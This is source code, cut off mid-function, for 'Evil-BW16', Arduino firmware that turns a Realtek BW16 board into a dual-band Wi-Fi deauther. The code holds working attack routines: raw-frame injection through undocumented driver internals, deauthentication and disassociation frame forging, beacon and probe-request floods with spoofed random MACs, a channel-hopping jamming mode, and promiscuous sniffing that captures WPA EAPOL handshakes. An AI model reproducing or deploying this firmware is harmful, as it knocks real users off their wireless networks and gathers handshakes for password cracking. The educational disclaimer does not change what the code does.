/*
   Evil-BW16 - WiFi Dual band deauther

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-BW16, is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-BW16
   assumes no liability and is not responsible for any misuse or damage caused by this tool.
   Users are required to comply with all applicable laws and regulations in their jurisdiction
   regarding network testing and ethical hacking.
*/

#include <Arduino.h>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "platform_stdlib.h"
// Use Adafruit SSD1306 library (with BW16 fix)
// Define missing SPI constants for AmebaD compatibility
#ifndef SPI_MODE0
#define SPI_MODE0 0x00
#define SPI_MODE1 0x04
#define SPI_MODE2 0x08
#define SPI_MODE3 0x0C
#endif

#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Wire.h>

#ifdef max
#undef max
#endif
#ifdef min
#undef min
#endif

#include <vector>

// Hardware configuration - CORRECTED based on actual BW16 pinout
// Default I2C pins for BW16
#define OLED_SDA 8      // GPIO8 (PA25) - default I2C SDA on BW16
#define OLED_SCL 7      // GPIO7 (PA26) - default I2C SCL on BW16

// Joystick pins (5-button D-pad style)
// GPIO0/GPIO1 freed from Log UART (USB-C) for joystick use
// USB-C is power/flashing ONLY - debug logs go to Serial1 (D4/D5)
#define JOY_UP    3     // GPIO3 (PA30) - D-pad Up
#define JOY_DOWN  6     // GPIO6 (PB3)  - D-pad Down
#define JOY_LEFT  0     // GPIO0 (PA7)  - D-pad Left (was LOG_TX, now joystick)
#define JOY_RIGHT 1     // GPIO1 (PA8)  - D-pad Right (was LOG_RX, now joystick)
#define JOY_MID   2     // GPIO2 (PA27) - Center/Select button (was SWD_DATA)

// Serial1 debug output pins (LP UART)
//   TX = D4 (PB1) - Serial1 TX → wire to external UART-to-USB-C RX
//   RX = D5 (PB2) - Serial1 RX → wire to external UART-to-USB-C TX
// These are the header pins for debug logs + command input

// LED pins - DON'T redefine! They're already defined in variant.h
// LED_R, LED_G, LED_B are predefined as AMB_D12, AMB_D10, AMB_D11

// OLED display object (SSD1306 128x64, I2C)

// Pin Assignments (BW16 Module) - v1.0.3
// I2C:
//   OLED_SDA = D8 (PA25) - default I2C SDA
//   OLED_SCL = D7 (PA26) - default I2C SCL
// Joystick (D-pad, 5 buttons):
//   JOY_UP    = D3  (PA30) - Up
//   JOY_DOWN  = D6  (PB3)  - Down
//   JOY_LEFT  = D0  (PA7)  - Left  (freed from Log UART)
//   JOY_RIGHT = D1  (PA8)  - Right (freed from Log UART)
//   JOY_MID   = D2  (PA27) - Select/OK
// Serial1 (LP UART, debug + commands):
//   TX = D4 (PB1) → external UART-to-USB-C adapter RX
//   RX = D5 (PB2) → external UART-to-USB-C adapter TX
// USB-C: Power + Flashing ONLY (no runtime serial)
// LEDs (if used):
//   LED_R, LED_G, LED_B defined elsewhere

// Adafruit SSD1306 display object
Adafruit_SSD1306 display(128, 64, &Wire, -1);  // Hardware I2C with default pins (GPIO 8/7)

// Menu system
enum MenuState {
  MENU_MAIN,
  MENU_SCAN,
  MENU_SCAN_RESULTS,
  MENU_ATTACK,
  MENU_FLOOD,
  MENU_SNIFFER,
  MENU_SNIFF_MODE,
  MENU_DEAUTH,
  MENU_CONFIG,
  MENU_CONFIG_EDIT,
  MENU_INFO,
  MENU_TARGET_LIST,
  MENU_TIMER,
  MENU_SINGLE_AP
};
MenuState currentMenu = MENU_MAIN;
int menuIndex = 0;      // Selected item in current menu
int scanResultOffset = 0; // For scrolling scan results
// maxVisibleItems replaced by per-menu visible counts

// Config menu items (global scope for use in both updateDisplay and handleJoystick)
const char* configItems[] = {"Ch Start", "Cycle ms", "Scan ms", "Frames", "LED", "Hop"};
const int numConfigItems = 6;
int configIndex = 0;

// Joystick state
// Debounce tracking per button
unsigned long joyLastPress[5] = {0}; // UP, DOWN, LEFT, RIGHT, MID
const unsigned long JOY_DEBOUNCE_MS = 200; // 200ms debounce
const int joyPins[5] = {JOY_UP, JOY_DOWN, JOY_LEFT, JOY_RIGHT, JOY_MID};


//==========================
// User Configuration
//==========================
#define WIFI_SSID       "7h30th3r0n35Ghz"
#define WIFI_PASS       "5Ghz7h30th3r0n3Pass"
#define WIFI_CHANNEL    1

bool USE_LED = true;

// Attack parameters
unsigned long last_cycle     = 0;
unsigned long cycle_delay    = 2000;     // Delay between attack cycles (ms)
unsigned long scan_time      = 1000;     // Reduced from 5000 to 1000 ms (1 second)
unsigned long num_send_frames = 10;
int start_channel            = 1;        // 1 => 2.4GHz start, 36 => 5GHz only
bool scan_between_cycles     = false;    // If true, scans between each attack cycle

uint8_t dst_mac[6]  = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast

// Rotating reason codes for deauth/disassoc
const uint16_t deauth_reasons[] = {1, 2, 4, 6, 7};
const uint16_t disassoc_reasons[] = {1, 2, 3, 8};
const uint8_t num_deauth_reasons = sizeof(deauth_reasons) / sizeof(deauth_reasons[0]);
const uint8_t num_disassoc_reasons = sizeof(disassoc_reasons) / sizeof(disassoc_reasons[0]);

enum SniffMode {
  SNIFF_ALL,
  SNIFF_BEACON,
  SNIFF_PROBE,
  SNIFF_DEAUTH,
  SNIFF_EAPOL,
  SNIFF_PWNAGOTCHI,
  SNIFF_STOP
};

// Channel hopping configuration
bool isHopping = false;
unsigned long lastHopTime = 0;
const unsigned long HOP_INTERVAL = 500; // 500ms between hops
const int CHANNELS_2GHZ[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
const int CHANNELS_5GHZ[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
int currentChannelIndex = 0;
int currentChannel = 36; // Default channel

SniffMode currentMode = SNIFF_STOP;  // Start in STOP mode
bool isSniffing = false;             // Global flag to track if sniffing is active

// Add these after the other global variables
const int MAX_CUSTOM_CHANNELS = 50;
int customChannels[MAX_CUSTOM_CHANNELS];
int numCustomChannels = 0;
bool useCustomChannels = false;

//-------------------
// Timed Attack
//-------------------
bool timedAttackEnabled      = false;
unsigned long attackStartTime = 0;
unsigned long attackDuration  = 10000; // default 10 seconds

//==========================================================
// Frame Structures
//==========================================================
// Rotating sequence number counter (must be nonzero; real APs increment)
static uint16_t seq_num_counter = 1;

typedef struct {
  uint16_t frame_control = 0x00C0;  // Deauth (little-endian on wire)
  uint16_t duration = 0x003A;        // Standard duration for management frames
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  uint16_t sequence_number = 0;      // Will be set per-frame
  uint16_t reason = 0x0006;
} DeauthFrame;

typedef struct {
  uint16_t frame_control = 0x00A0;  // Disassociation (little-endian on wire)
  uint16_t duration = 0x003A;        // Standard duration for management frames
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  uint16_t sequence_number = 0;      // Will be set per-frame
  uint16_t reason = 0x0008;
} DisassocFrame;

//==========================================================
// Beacon Frame Structure (for beacon flood)
//==========================================================
// Beacon frame: FC=0x0080, plus fixed params (timestamp 8B, beacon_interval 2B, capability 2B)
// then tagged params (SSID, supported rates, DS params, etc.)
#define BEACON_MAX_SSID_LEN 20
#define BEACON_FRAME_BASE_SIZE (24 + 12)  // header + fixed params
typedef struct {
  uint16_t frame_control = 0x0080;  // Beacon
  uint16_t duration = 0x0000;
  uint8_t destination[6];            // Broadcast
  uint8_t source[6];                // Random MAC
  uint8_t access_point[6];          // Same as source
  uint16_t sequence_number = 0;
  // Fixed params
  uint64_t timestamp = 0;
  uint16_t beacon_interval = 0x0064;  // 100 TUs
  uint16_t capability = 0x0001;      // ESS
  // Tagged params start here (variable length, appended in code)
} BeaconFrameHeader;

//==========================================================
// Probe Request Frame Structure (for probe flood)
//==========================================================
typedef struct {
  uint16_t frame_control = 0x0040;  // Probe Request
  uint16_t duration = 0x0000;
  uint8_t destination[6];            // Broadcast
  uint8_t source[6];                // Random MAC
  uint8_t access_point[6];          // Broadcast
  uint16_t sequence_number = 0;
  // Tagged params start here (SSID tag)
} ProbeReqFrameHeader;

//==========================================================
// Data Structures
//==========================================================
struct WiFiScanResult {
  bool selected = false;
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
};

struct WiFiStationResult {
  bool selected = false;
  String mac_str;
  uint8_t mac[6];
  short rssi;
};

// =========================
// 802.11 Header Structure
// =========================
#pragma pack(push, 1)
struct wifi_ieee80211_mac_hdr {
  uint16_t frame_control;
  uint16_t duration_id;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
};
#pragma pack(pop)

//==========================================================
// Global Vectors (must be declared before functions that use them)
//==========================================================
std::vector<WiFiScanResult> scan_results;
std::vector<WiFiScanResult> target_aps;
bool attack_enabled = false;
bool scan_enabled   = false;
bool target_mode    = false;

// Update target_aps vector from selected scan results
void updateTargetsFromSelected() {
  target_aps.clear();
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].selected) {
      target_aps.push_back(scan_results[i]);
    }
  }
  target_mode = !target_aps.empty();
  if (target_mode) {
    Serial1.println("[INFO] Selected " + String(target_aps.size()) + " target(s)");
  } else {
    Serial1.println("[INFO] No targets selected");
  }
}

static inline uint8_t ieee80211_get_type(uint16_t fc) {
  return (fc & 0x0C) >> 2;
}
static inline uint8_t ieee80211_get_subtype(uint16_t fc) {
  return (fc & 0xF0) >> 4;
}
static inline bool is_broadcast_mac(const uint8_t *mac) {
  return mac[0]==0xFF && mac[1]==0xFF && mac[2]==0xFF && mac[3]==0xFF && mac[4]==0xFF && mac[5]==0xFF;
}



//==========================================================
// New Attack Modes (declared before promisc_callback)
//==========================================================
bool beacon_flood_enabled    = false;
unsigned long beacon_flood_delay = 50;   // ms between beacons
unsigned long last_beacon_flood  = 0;
uint16_t beacon_flood_count  = 0;

bool probe_flood_enabled     = false;
unsigned long probe_flood_delay = 30;   // ms between probes
unsigned long last_probe_flood  = 0;
uint16_t probe_flood_count   = 0;

bool signal_jam_enabled     = false;
unsigned long signal_jam_hop_delay = 100; // ms per channel
unsigned long last_signal_jam  = 0;
int signal_jam_ch_index     = 0;
uint16_t signal_jam_count   = 0;

bool deauth_sniff_enabled   = false;
uint8_t sniffed_deauth_src[6] = {0};  // MAC of deauth sender we sniffed
bool has_sniffed_deauth     = false;
unsigned long last_deauth_sniff_attack = 0;
unsigned long deauth_sniff_interval = 500;  // ms between attacks

// Timer presets (in seconds)
const unsigned long timer_presets[] = {10, 30, 60, 120, 300};
const int num_timer_presets = 5;
int timer_preset_index = 1;  // Default: 30s

// Single AP attack target index
int single_ap_index = 0;

// Random MAC generation
void randomMAC(uint8_t *mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 256);
  }
  // Set locally administered bit
  mac[0] = (mac[0] & 0xFE) | 0x02;
}

// =========================
// Promiscuous Callback
// =========================
void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/) {
  if (currentMode == SNIFF_STOP) return;

  // Checks the minimum size to contain the 802.11 header
  if (!buf || len < sizeof(wifi_ieee80211_mac_hdr)) {
    return;
  }

  // Interpret the header
  wifi_ieee80211_mac_hdr *hdr = (wifi_ieee80211_mac_hdr *)buf;
  uint16_t fc = hdr->frame_control;
  uint8_t ftype = ieee80211_get_type(fc);
  uint8_t fsubtype = ieee80211_get_subtype(fc);

  // Filter based on current mode
  if (currentMode != SNIFF_ALL) {
    if (currentMode == SNIFF_BEACON && !(ftype == 0 && fsubtype == 8)) return;
    if (currentMode == SNIFF_PROBE && !(ftype == 0 && (fsubtype == 4 || fsubtype == 5))) return;
    if (currentMode == SNIFF_DEAUTH && !(ftype == 0 && (fsubtype == 12 || fsubtype == 10))) return;
    if (currentMode == SNIFF_EAPOL && (ftype != 2 || !isEAPOL(buf, len))) return;
    if (currentMode == SNIFF_PWNAGOTCHI && !(ftype == 0 && fsubtype == 8 && isPwnagotchiMac(hdr->addr2))) return;
  }

  String output = ""; // Initialize an output string to store the results

  // ============ Management ============
  if (ftype == 0) {
    // Beacon
    if (fsubtype == 8) {
      output += "[MGMT] Beacon detected ";
      // Source MAC => hdr->addr2
      output += "Source MAC: ";
      char macBuf[18];
      snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      output += macBuf;

      // Try to retrieve the ESSID
      const uint8_t *framePtr = (const uint8_t *)buf;
      String ssid = extractSSID(framePtr, len);
      if (ssid.length() > 0) {
        output += " SSID: " + ssid;
        // Check if it's a pwnagotchi (MAC DE:AD:BE:EF:DE:AD)
        if (isPwnagotchiMac(hdr->addr2)) {
          output += " Pwnagotchi Beacon!";
        }
      }
    }
    // Deauth
    else if (fsubtype == 12 || fsubtype == 10) {
      output += "[MGMT] Deauth detected ";
      // Sender MAC => hdr->addr2, Receiver MAC => hdr->addr1
      char senderMac[18], receiverMac[18];
      snprintf(senderMac, sizeof(senderMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      snprintf(receiverMac, sizeof(receiverMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
               hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
      output += "Sender MAC: " + String(senderMac) + " Receiver MAC: " + String(receiverMac);
      if (len >= 26) { // 24-byte header + 2 bytes reason
        uint16_t reasonCode = (uint16_t)buf[24] | ((uint16_t)buf[25] << 8);
        output += " Reason code: " + String(reasonCode);
      }
      // Capture deauth source for deauth-sniff mode
      if (deauth_sniff_enabled && !is_broadcast_mac(hdr->addr1)) {
        memcpy(sniffed_deauth_src, hdr->addr2, 6);
        has_sniffed_deauth = true;
      }
    }
    // Probe Request
    else if (fsubtype == 4) {
      output += "[MGMT] Probe Request ";
      // Displays the source
      char sourceMac[18];
      snprintf(sourceMac, sizeof(sourceMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      output += "Source MAC: " + String(sourceMac);

      // Try to retrieve the requested ESSID (often, it's an empty SSID for scanning)
      const uint8_t *framePtr = (const uint8_t *)buf;
      String ssid = extractSSID(framePtr, len);
      if (ssid.length() > 0) {
        output += " Probe SSID: " + ssid;
      }
    }
    // Probe Response
    else if (fsubtype == 5) {
      output += "[MGMT] Probe Response ";
      // Displays the source
      char sourceMac[18];
      snprintf(sourceMac, sizeof(sourceMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      output += "Source MAC: " + String(sourceMac);

      // Try to retrieve the ESSID
      const uint8_t *framePtr = (const uint8_t *)buf;
      String ssid = extractSSID(framePtr, len);
      if (ssid.length() > 0) {
        output += " SSID: " + ssid;
      }
    }
    // Disassoc
    else if (fsubtype == 10) {
      output += "[MGMT] Disassoc detected ";
      // Sender MAC => hdr->addr2, Receiver MAC => hdr->addr1
      char senderMac[18], receiverMac[18];
      snprintf(senderMac, sizeof(senderMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      snprintf(receiverMac, sizeof(receiverMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
               hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
      output += "Sender MAC: " + String(senderMac) + " Receiver MAC: " + String(receiverMac);
    }
    else {
      output += "[MGMT] Other subtype = " + String(fsubtype);
    }
  }
  // ============ Control ============
  else if (ftype == 1) {
    output += "[CTRL] Subtype = " + String(fsubtype);
  }
  // ============ Data ============
  else if (ftype == 2) {
    // Try EAPOL detection
    if (isEAPOL(buf, len)) {
      output += "[DATA] EAPOL detected! ";
      // Display source and destination MAC
      char sourceMac[18], destMac[18];
      snprintf(sourceMac, sizeof(sourceMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      snprintf(destMac, sizeof(destMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
               hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
      output += "Source MAC: " + String(sourceMac) + " Destination MAC: " + String(destMac);
    } else {
      output += "[DATA] Other data frame.";
    }
  }
  // ============ Extension (rare) ============
  else {
    output += "[EXT] Type = " + String(ftype);
  }

  // Print the output in a single line
  Serial1.println(output);
}
// =========================
// Utility Functions
// =========================


void setChannel(int newChannel) {
  if (!isSniffing) {
    // Need to initialize WiFi first
    wifi_on(RTW_MODE_PROMISC);
    wifi_enter_promisc_mode();
  }
  currentChannel = newChannel;
  wifi_set_channel(currentChannel);
}

void hopChannel() {
  if (isHopping && (millis() - lastHopTime >= HOP_INTERVAL)) {
    currentChannelIndex++;

    if (useCustomChannels) {
      // Hopping on custom-defined channels
      if (currentChannelIndex >= numCustomChannels) {
        currentChannelIndex = 0;
      }
      currentChannel = customChannels[currentChannelIndex];
    } else {
      // Hopping between 2.4 GHz and 5.8 GHz bands
      static bool use5GHz = false; // Alternates between the two bands

      if (use5GHz) {
        // Check if we exceed the available channels in the 5 GHz band
        if ((size_t)currentChannelIndex >= sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0])) {
          currentChannelIndex = 0;
          use5GHz = false; // Switch to the 2.4 GHz band
        }
        currentChannel = CHANNELS_5GHZ[currentChannelIndex];
      } else {
        // Check if we exceed the available channels in the 2.4 GHz band
        if ((size_t)currentChannelIndex >= sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0])) {
          currentChannelIndex = 0;
          use5GHz = true; // Switch to the 5 GHz band
        }
        currentChannel = CHANNELS_2GHZ[currentChannelIndex];
      }
    }

    setChannel(currentChannel); // Set the selected channel
    Serial1.print("[HOP] Switched to channel ");
    Serial1.println(currentChannel);
    lastHopTime = millis(); // Update the last hop time
  }
}



void startSniffing() {
  if (!isSniffing) {
    Serial1.println("[INFO] Enabling promiscuous mode...");

    // Initialize WiFi in PROMISC mode
    wifi_on(RTW_MODE_PROMISC);
    wifi_enter_promisc_mode();
    setChannel(currentChannel);
    wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);

    isSniffing = true;
    Serial1.println("[INFO] Sniffer initialized and running.");
  }
}

void stopSniffing() {
  if (isSniffing) {
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    isSniffing = false;
    currentMode = SNIFF_STOP;
    Serial1.println("[CMD] Sniffer stopped");
  }
}

// Prints a MAC address on the serial port, format XX:XX:XX:XX:XX:XX
void printMac(const uint8_t *mac) {
  char buf[18]; // XX:XX:XX:XX:XX:XX + terminator
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  Serial1.print(buf);
}


// Tries to extract the ESSID from a Beacon or Probe in the payload,
// assuming a basic Management header (24 bytes) + 12 fixed bytes
// => We usually start at offset 36 for the first tag.
// WARNING: This method is simplified and may fail if other tags precede the SSID.
String extractSSID(const uint8_t *frame, int totalLen) {
  // Minimal offset for the variable part (SSID tag) after a standard Beacon/Probe
  const int possibleOffset = 36;
  if (totalLen < possibleOffset + 2) {
    return "";
  }

  // The first tag should be the SSID tag (ID = 0)
  // frame[possibleOffset] = tagNumber, frame[possibleOffset+1] = tagLength
  uint8_t tagNumber  = frame[possibleOffset];
  uint8_t tagLength  = frame[possibleOffset + 1];

  // If we have an SSID tag
  if (tagNumber == 0 && possibleOffset + 2 + tagLength <= totalLen) {
    // Build the string
    String essid;
    for (int i = 0; i < tagLength; i++) {
      char c = (char)frame[possibleOffset + 2 + i];
      // Basic filter: only printable ASCII characters are shown
      if (c >= 32 && c <= 126) {
        essid += c;
      }
    }
    return essid;
  }
  // Not found / non-SSID tag
  return "";
}

// Checks if the source MAC is "DE:AD:BE:EF:DE:AD"
bool isPwnagotchiMac(const uint8_t *mac) {
  const uint8_t pwnMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD};
  for (int i = 0; i < 6; i++) {
    if (mac[i] != pwnMac[i]) return false;
  }
  return true;
}
bool isEAPOL(const uint8_t *buf, int len) {
  // Check the minimum size:
  // 24 bytes for the MAC header, +8 for LLC/SNAP, +4 for a minimal EAPOL
  if (len < (24 + 8 + 4)) {
    return false;
  }

  // First case: "classic" frame (without QoS)
  // Check for the presence of the LLC/SNAP header indicating EAPOL (0x88, 0x8E)
  if (buf[24] == 0xAA && buf[25] == 0xAA && buf[26] == 0x03 &&
      buf[27] == 0x00 && buf[28] == 0x00 && buf[29] == 0x00 &&
      buf[30] == 0x88 && buf[31] == 0x8E) {
    return true;
  }

  // Second case: QoS frame (Frame Control field indicates a QoS data subtype)
  // We identify this if (buf[0] & 0x0F) == 0x08 (subtype = 1000b = 8)
  // In this case, the QoS header adds 2 extra bytes after the initial 24 bytes,
  // so the LLC/SNAP header starts at offset 24 + 2 = 26
  if ((buf[0] & 0x0F) == 0x08) {
    if (buf[26] == 0xAA && buf[27] == 0xAA && buf[28] == 0x03 &&
        buf[29] == 0x00 && buf[30] == 0x00 && buf[31] == 0x00 &&
        buf[32] == 0x88 && buf[33] == 0x8E) {
      return true;
    }
  }

  return false;
}


//==========================================================
// Externs & Prototypes (Realtek / Ameba Specific)
//==========================================================
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

// Typically: int wifi_get_mac_address(char *mac);
extern "C" int wifi_get_mac_address(char *mac);

//==========================================================
// Function Prototypes
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length);
void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x06);
void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x08);

int scanNetworks();
void printScanResults();
void handleCommand(String command);
void handleJoystick(); // Joystick handler
void targetAttack();
void generalAttack();
void attackCycle();
void startTimedAttack(unsigned long durationMs);
void checkTimedAttack();
// bool initSD(); // SD card removed


//==========================================================
// Disassociation Attack Control
//==========================================================
bool disassoc_enabled           = false;  // If true, perform continuous disassoc
unsigned long disassoc_interval = 1000;   // Interval in ms
unsigned long last_disassoc_attack = 0;



//==========================================================
// Raw Frame Injection
//==========================================================
// Track TX success/failure for debugging
static uint32_t tx_success_count = 0;
static uint32_t tx_fail_count = 0;

void wifi_tx_raw_frame(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)((uint8_t*)rltk_wlan_info + 0x10);
  if (ptr == NULL) {
    tx_fail_count++;
    Serial1.println("[TX ERROR] rltk_wlan_info ptr is NULL!");
    return;
  }

  void *frame_control = alloc_mgtxmitframe((uint8_t*)ptr + 0xae0);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, (uint8_t*)frame_control + 8);
    memset((void *) * (uint32_t *)((uint8_t*)frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *) * (uint32_t *)((uint8_t*)frame_control + 0x80) + 0x28;
    if (frame_data == NULL) {
      tx_fail_count++;
      Serial1.println("[TX ERROR] frame_data is NULL!");
      return;
    }
    memcpy(frame_data, frame, length);
    *(uint32_t *)((uint8_t*)frame_control + 0x14) = length;
    *(uint32_t *)((uint8_t*)frame_control + 0x18) = length;
    int ret = dump_mgntframe(ptr, frame_control);
    if (ret == 0) {
      tx_success_count++;
    } else {
      tx_fail_count++;
      Serial1.print("[TX ERROR] dump_mgntframe returned: ");
      Serial1.println(ret);
    }
  } else {
    tx_fail_count++;
    Serial1.println("[TX ERROR] alloc_mgtxmitframe returned NULL!");
  }
}

//==========================================================
// Deauth & Disassoc
//==========================================================
void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DeauthFrame));
}

void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
}

//==========================================================
// Beacon Flood TX
//==========================================================
void wifi_tx_beacon_frame(const char* ssid, uint8_t ssid_len, uint8_t channel) {
  // Build a complete beacon frame with tagged params
  // Header (24) + fixed (12) + SSID tag (2+ssid_len) + DS params (3) + supported rates (4)
  size_t frame_len = 24 + 12 + (2 + ssid_len) + 3 + 4;
  uint8_t *buf = (uint8_t*)malloc(frame_len);
  if (!buf) return;
  memset(buf, 0, frame_len);
  
  // Frame Control = 0x0080 (Beacon)
  buf[0] = 0x80; buf[1] = 0x00;
  // Duration = 0
  buf[2] = 0x00; buf[3] = 0x00;
  // DA = broadcast
  memset(&buf[4], 0xFF, 6);
  // SA = random
  randomMAC(&buf[10]);
  // BSSID = same as SA
  memcpy(&buf[16], &buf[10], 6);
  // Seq = rotating
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[22] = seq & 0xFF; buf[23] = (seq >> 8) & 0xFF;
  
  // Fixed params
  // Timestamp (8 bytes) - just use millis
  unsigned long ts = millis();
  memcpy(&buf[24], &ts, 4);  // low 4 bytes
  // Beacon interval = 100 TUs
  buf[32] = 0x64; buf[33] = 0x00;
  // Capability = ESS
  buf[34] = 0x01; buf[35] = 0x00;
  
  // Tagged params
  int offset = 36;
  // SSID tag (ID=0)
  buf[offset++] = 0x00;  // Tag ID
  buf[offset++] = ssid_len;
  memcpy(&buf[offset], ssid, ssid_len);
  offset += ssid_len;
  // DS Parameter Set (ID=3, len=1, channel)
  buf[offset++] = 0x03;
  buf[offset++] = 0x01;
  buf[offset++] = channel;
  // Supported Rates (ID=1, len=4)
  buf[offset++] = 0x01;
  buf[offset++] = 0x04;
  buf[offset++] = 0x82;  // 1 Mbps (basic)
  buf[offset++] = 0x84;  // 2 Mbps (basic)
  buf[offset++] = 0x8B;  // 5.5 Mbps (basic)
  buf[offset++] = 0x96;  // 11 Mbps (basic)
  
  wifi_tx_raw_frame(buf, frame_len);
  free(buf);
}

//==========================================================
// Probe Request Flood TX
//==========================================================
void wifi_tx_probe_req_frame(const char* ssid, uint8_t ssid_len) {
  size_t frame_len = 24 + (2 + ssid_len) + 4;  // header + SSID tag + rates tag
  uint8_t *buf = (uint8_t*)malloc(frame_len);
  if (!buf) return;
  memset(buf, 0, frame_len);
  
  // Frame Control = 0x0040 (Probe Request)
  buf[0] = 0x40; buf[1] = 0x00;
  // Duration = 0
  buf[2] = 0x00; buf[3] = 0x00;
  // DA = broadcast
  memset(&buf[4], 0xFF, 6);
  // SA = random
  randomMAC(&buf[10]);
  // BSSID = broadcast
  memset(&buf[16], 0xFF, 6);
  // Seq
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[22] = seq & 0xFF; buf[23] = (seq >> 8) & 0xFF;
  
  // Tagged params
  int offset = 24;
  // SSID tag (ID=0)
  buf[offset++] = 0x00;
  buf[offset++] = ssid_len;
  memcpy(&buf[offset], ssid, ssid_len);
  offset += ssid_len;
  // Supported Rates (ID=1)
  buf[offset++] = 0x01;
  buf[offset++] = 0x04;
  buf[offset++] = 0x82;
  buf[offset++] = 0x84;
  buf[offset++] = 0x8B;
  buf[offset++] = 0x96;
  
  wifi_tx_raw_frame(buf, frame_len);
  free(buf);
}

//==========================================================
// Sorting Helper
//==========================================================
void sortByChannel(std::vector<WiFiScanResult> &results) {
  for (size_t i = 0; i < results.size(); i++) {
    size_t min_idx = i;
